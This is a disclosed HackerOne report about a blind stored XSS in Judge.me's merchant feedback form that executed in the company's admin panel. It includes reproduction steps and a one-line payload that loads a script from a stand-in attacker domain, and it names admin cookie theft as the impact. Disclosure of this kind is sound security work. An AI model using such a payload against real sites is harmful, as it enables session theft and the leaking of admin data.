---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - vuln/xss
  - vuln/privilege-escalation
  - vuln/info-disclosure
  - impact/credential-theft
  - trigger/admin-required
  - trigger/session-cookie
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2022-05-03
submitted: 2021-09-14T02:50:57.719Z
bounty_usd: null
votes: 57
cve: []
program: "[[programs/judgeme|Judge.me ]]"
reporter: "b3hlull"
source: "https://hackerone.com/reports/1339034"
title: "Blind XSS via Feedback form."
---
# Blind XSS via Feedback form.

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 57 | **Program:** Judge.me  | **Disclosed:** 2022-05-03

- Report: [https://hackerone.com/reports/1339034](https://hackerone.com/reports/1339034)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2021-09-14T02:50:57.719Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

Hi Team,

 I found Blind XSS which is triggered on the admin panel. I was trying to add widgets on the installation page for default theme. When the installation was done, I saw a question like that Are you happy with how everything looks?. I clicked the No, please remove all widgets button and then the feedback form arrives. I submitted my blind XSS payload. It triggered in 20-30 minutes on https://judge.me/admin which requires the HTTP Basic Authentication. I can't get the admin session cookie but I can collect all of the admin pages.

## Steps To Reproduce:

  1. Go to https://odo-tester.myshopify.com/admin/ and login with the test credentials.** (credentials in the Credentials Header)**
  1. Click the **Apps** tab from the left side and then click **Judge.me Product Reviews**.
  1. Click** Add Widgets** then **Start Installation** and continue.
  1. When the installation is done. It asks **Are you happy with how everything looks?**. Choose  **No, please remove all widgets button**. Feedback form appears and put your blind xss payload.
  1. Wait for payload triggering.

## Supporting Material/References:

Vulnerable Page URL : https://judge.me/admin/████████
Referer: https://judge.me/admin/███

Cookies:```http
██████████████ ```


## Credentials

```http
email:  ██████████@yopmail.com
password: ███████
tempmail: https://yopmail.com/?judgeme-███████████ ( it can be necessary when you are login )
payload: "><script src=https://yourxssdomain></script>
```

 Admin Page
=====================
█████
Vulnerable Page
=====================
███████ 
Steps to Reproduce Video
=====================
████

## Impact

Blind XSS leads to access the admin panel. It may contain information leaks about other shop owners' reports. Executes javascript code on admin panel. Stealing admin cookies.

## Timeline

- **Report Filed**
- **2021-09-20** @lucdang2804: Hi b3hlull,
Thank you for your submission. I hope you are well. We were able to validate your report and have submitted this issue to team for fixing.

I will get back to you in 1 or 2 days with the information relate to when we will implement this, the severity and the bounty.

Once again, thank you so much for your submission.
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2021-09-20** @b3hlull: Hi @lucdang2804 thanks for validation. Thanks for triage and bounty @linhdam .

Best regards both of you.
- **Report Retesting**
- **User Completed Retest**
- **2021-09-22** @b3hlull: @linhdam If you want to be sure for retest, you can check my tickets on https://support.judge.me. 
Ticket ID: 303140, 303152, 303173,303186
- **Report Retest Approved**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
